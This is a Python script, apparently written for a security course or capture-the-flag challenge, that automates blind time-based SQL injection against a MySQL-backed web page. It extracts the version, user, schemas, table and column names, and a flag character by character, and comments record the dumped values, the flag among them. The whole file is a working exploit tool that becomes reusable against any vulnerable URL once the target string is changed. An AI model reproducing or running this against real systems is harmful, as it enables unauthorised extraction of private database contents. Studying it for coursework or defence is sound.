import requests
import time
char_list="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$^&*()-+={}[]<>/,.'\\\"_"

def time_sqli(payload, query):
    i = 0
    j = 1
    result = ""
    while i < len(char_list):
        time_query = "IF((ASCII(SUBSTRING((" + query + ")," + str(j) + ",1)) = " + str(ord(char_list[i])) + "), sleep(5), 0)"
        url = payload.replace("$INPUT", time_query)
        #print url
        start = int(time.time())
        r = requests.get(url)
        end = int(time.time())
        #print r.content
        if end - start >= 4:
            result = result + char_list[i]
            print result
            i = 0
            j += 1
            continue
        i += 1
    print query + " = " + result
    return result

def time_sqli_list(payload):
    # version = 5.5.38-0ubuntu0.14.04.1
    query = "@@version"
    result = time_sqli(payload, query)
    # current user() = sqli_time@localhost
    query = "user()"
    result = time_sqli(payload, query)
    # current database() = sqli_time
    query = "database()"
    result = time_sqli(payload, query)
    # list database = news, title
    query = "SELECT schema_name FROM information_schema.schemata limit 0,1"
    query = "SELECT schema_name FROM information_schema.schemata limit 1,1"
    result = time_sqli(payload, query)
    # list table_schema = sqli_time
    query = "SELECT table_schema FROM information_schema.tables "
    query += "WHERE table_schema != 'mysql' AND table_schema != 'information_schema' limit 0,1"
    result = time_sqli(payload, query)
    # list table_name = news, what_flags
    query = "SELECT table_name FROM information_schema.tables "
    query += "WHERE table_schema != 'mysql' AND table_schema != 'information_schema' limit 1,1"
    result = time_sqli(payload, query)
    # list columes = id, title, flag
    query = "SELECT column_name FROM information_schema.columns "
    query += "WHERE table_schema != 'mysql' AND table_schema != 'information_schema' limit 3,1"
    result = time_sqli(payload, query)
    # SecProg{why_it_took_so_long}
    query = "SELECT flag FROM what_flags limit 0,1"
    result = time_sqli(payload, query)

if __name__ == "__main__":
    payload = "http://tor.atdog.tw:8080/time/track.php?action=1 and $INPUT"
    time_sqli_list(payload)

